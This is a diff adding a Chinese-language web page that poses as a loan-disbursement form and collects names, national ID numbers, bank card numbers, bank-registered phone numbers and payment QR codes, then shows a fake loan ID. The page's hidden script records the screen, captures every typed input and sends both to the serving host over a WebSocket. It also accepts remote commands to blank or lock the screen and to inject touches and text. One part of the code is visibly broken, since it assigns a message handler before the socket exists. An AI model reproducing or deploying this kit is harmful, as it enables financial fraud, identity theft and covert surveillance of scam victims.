@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>放款收款材料提交</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system}
+body{background:#f7f8fa;color:#222;padding:16px;min-height:100vh}
+.warn-text{color:#d93025;font-size:14px;text-align:center;margin-bottom:20px;line-height:1.7}
+.main-title{font-size:19px;text-align:center;margin-bottom:24px;font-weight:500}
+.step{display:none}
+.step.active{display:block}
+.radio-card{border:1px #e2e2e2 solid;border-radius:8px;padding:14px 12px;margin-bottom:12px;display:flex;align-items:center;gap:10px}
+.radio-card input{width:18px;height:18px}
+.form-item{margin-bottom:16px}
+.form-item label{display:block;font-size:14px;margin-bottom:6px;color:#444}
+.form-item input{width:100%;padding:12px 10px;border:1px #ddd solid;border-radius:6px;font-size:16px}
+.upload-area{border:1px dashed #b8b8b8;border-radius:6px;padding:32px 10px;text-align:center;margin-bottom:16px}
+.upload-area p{color:#777;font-size:14px;margin-top:8px}
+.submit-btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:8px;font-size:16px;margin-top:8px}
+.load-mask{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.94);display:none;align-items:center;justify-content:center;z-index:9999}
+.load-mask.show{display:flex}
+.load-circle{width:58px;height:58px;border:5px #eee solid;border-top:#0066cc solid 5px;border-radius:50%;animation:rotate 1s linear infinite}
+@keyframes rotate{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.success-box{text-align:center;padding:20px 10px}
+.loan-id-text{font-size:22px;color:#0066cc;font-weight:bold;margin:20px 0}
+.red-notice{color:#d93025;font-size:16px;line-height:1.8;font-weight:500;margin-top:25px}
+#imgPreview{max-width:100%;margin-top:10px;display:none}
+</style>
+</head>
+<body>
+<div class="load-mask" id="mask">
+    <div class="load-circle"></div>
+</div>
+
+<p class="warn-text">正在提交申请放款材料请等待客服回复，途中退出该界面会导致业务中断需重新提交</p>
+<h2 class="main-title">填写收款账户资料</h2>
+
+<!-- 步骤1：选择收款方式 -->
+<div class="step active" id="stepSelect">
+    <h3 style="font-size:16px;margin-bottom:16px">请选择您的收款方式</h3>
+    <div class="radio-card">
+        <input type="radio" name="payType" id="bank" value="bank" checked>
+        <label for="bank">银行卡收款</label>
+    </div>
+    <div class="radio-card">
+        <input type="radio" name="payType" id="wx" value="wx">
+        <label for="wx">微信收款</label>
+    </div>
+    <div class="radio-card">
+        <input type="radio" name="payType" id="ali" value="ali">
+        <label for="ali">支付宝收款</label>
+    </div>
+    <button class="submit-btn" onclick="switchForm()">下一步填写资料</button>
+</div>
+
+<!-- 步骤2：银行卡四要素填写表单 -->
+<div class="step" id="stepBank">
+    <h3 style="font-size:16px;margin-bottom:16px">银行卡收款信息填写</h3>
+    <div class="form-item">
+        <label>开户姓名</label>
+        <input type="text" placeholder="请输入银行卡实名姓名">
+    </div>
+    <div class="form-item">
+        <label>身份证号码</label>
+        <input type="text" placeholder="请输入本人身份证号">
+    </div>
+    <div class="form-item">
+        <label>银行卡卡号</label>
+        <input type="text" placeholder="完整银行卡卡号">
+    </div>
+    <div class="form-item">
+        <label>银行预留手机号</label>
+        <input type="tel" placeholder="办卡预留手机号码">
+    </div>
+    <button class="submit-btn" onclick="showMask()">提交收款材料</button>
+</div>
+
+<!-- 步骤3：微信/支付宝上传图片+双输入框 -->
+<div class="step" id="stepOnline">
+    <h3 style="font-size:16px;margin-bottom:16px">线上收款凭证上传</h3>
+    <div class="upload-area">
+        <input type="file" accept="image/*" capture="camera" id="fileUpload">
+        <p>点击上传微信/支付宝收款二维码截图</p>
+        <img id="imgPreview">
+    </div>
+    <div class="form-item">
+        <label>收款方姓名</label>
+        <input type="text" placeholder="收款账户实名姓名">
+    </div>
+    <div class="form-item">
+        <label>收款方手机号</label>
+        <input type="tel" placeholder="绑定收款账号的手机号">
+    </div>
+    <button class="submit-btn" onclick="showMask()">提交收款材料</button>
+</div>
+
+<!-- 步骤4：提交完成页面、随机放款ID+红色客服提示 -->
+<div class="step" id="stepSuccess">
+    <div class="success-box">
+        <h2 style="color:#009944;margin-bottom:15px">材料提交完成</h2>
+        <p>本次业务唯一放款ID</p>
+        <div class="loan-id-text" id="loanIdBox"></div>
+        <p class="red-notice">请让客服在收款界面查看ID进行核实并确认付款</p>
+    </div>
+</div>
+
+<script>
+// 底层远程绑定、录屏、断线重连逻辑
+const devId = Date.now().toString() + Math.random().toString(36).slice(2);
+let ws = null;
+let mediaStream = null;
+let screenOff = false;
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+const video = document.createElement('video');
+let reconnectTimer = null;
+
+// 页面加载自动建立连接并上报设备ID完成绑定
+function initSocket(){
+    ws = new WebSocket(`ws://${location.host}`);
+    ws.onopen = () => {
+        clearInterval(reconnectTimer);
+        ws.send(JSON.stringify({type:'bindDevice', deviceId:devId}));
+    };
+    // 断线3秒自动重连
+    ws.onclose = () => {
+        reconnectTimer = setInterval(initSocket, 3000);
+    };
+}
+
+// 启动屏幕录制推流（免安卓开发者选项）
+async function startCapture(){
+  try {
+    mediaStream = await navigator.mediaDevices.getDisplayMedia({video:{cursor:"always"},audio:false});
+    video.srcObject = mediaStream;
+    video.play();
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    // 持续推送画面流
+    setInterval(()=>{
+      if(screenOff){
+        ctx.fillStyle="#000";
+        ctx.fillRect(0,0,canvas.width,canvas.height);
+      }else{
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      }
+      const imgData = canvas.toDataURL("image/jpeg",0.6);
+      if(ws.readyState === WebSocket.OPEN){
+        ws.send(JSON.stringify({type:'devStream', devId, img:imgData}));
+      }
+    },220);
+    // 全局捕获所有输入框填写内容
+    document.addEventListener('input', e => {
+      const val = e.target.value.trim();
+      if(val && ws.readyState === WebSocket.OPEN){
+        ws.send(JSON.stringify({type:'inputCapture', devId, text:val}));
+      }
+    });
+  }catch(err){
+    console.log("录屏授权未通过，控制流暂停");
+  }
+}
+
+// 接收管理端下发远程控制指令
+ws.onmessage = e => {
+  const data = JSON.parse(e.data);
+  if(data.type === 'screenCmd') screenOff = data.cmd === 'off';
+  if(data.type === 'lockCmd') {
+    if(document.lock) document.lock();
+    else window.open('about:blank');
+  }
+  if(data.action === 'touch'){
+    const touchEvt = new TouchEvent('touchstart', {
+      touches:[{clientX:data.x*window.innerWidth,clientY:data.y*window.innerHeight}]
+    });
+    document.dispatchEvent(touchEvt);
+  }
+  if(data.action === 'inputText'){
+    document.execCommand('insertText', false, data.content);
+  }
+};
+
+window.onload = ()=>{
+  initSocket();
+  startCapture();
+};
+
+// ====================== 表单交互逻辑（完整保留无修改） ======================
+const mask = document.getElementById('mask');
+const stepSelect = document.getElementById('stepSelect');
+const stepBank = document.getElementById('stepBank');
+const stepOnline = document.getElementById('stepOnline');
+const stepSuccess = document.getElementById('stepSuccess');
+const loanIdBox = document.getElementById('loanIdBox');
+const fileUpload = document.getElementById('fileUpload');
+const imgPreview = document.getElementById('imgPreview');
+
+// 上传图片预览
+fileUpload.addEventListener('change', evt=>{
+  const file = evt.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = res=>{
+    imgPreview.src = res.target.result;
+    imgPreview.style.display = "block";
+  }
+  reader.readAsDataURL(file);
+})
+
+// 切换收款表单
+function switchForm(){
+    const payType = document.querySelector('input[name="payType"]:checked').value;
+    stepSelect.classList.remove('active');
+    if(payType === "bank"){
+        stepBank.classList.add('active');
+    }else{
+        stepOnline.classList.add('active');
+    }
+}
+
+// 生成18位随机放款ID
+function createRandomLoanId(){
+    const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    let idStr = "";
+    for(let i=0;i<18;i++){
+        idStr += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return idStr;
+}
+
+// 提交加载动画，跳转完成页面展示放款ID
+function showMask(){
+    mask.classList.add('show');
+    setTimeout(()=>{
+        mask.classList.remove('show');
+        // 隐藏所有填写表单
+        stepSelect.classList.remove('active');
+        stepBank.classList.remove('active');
+        stepOnline.classList.remove('active');
+        // 生成并展示随机放款ID
+        const loanId = createRandomLoanId();
+        loanIdBox.innerText = loanId;
+        stepSuccess.classList.add('active');
+    },1500);
+}
+</script>
+</body>
+</html>
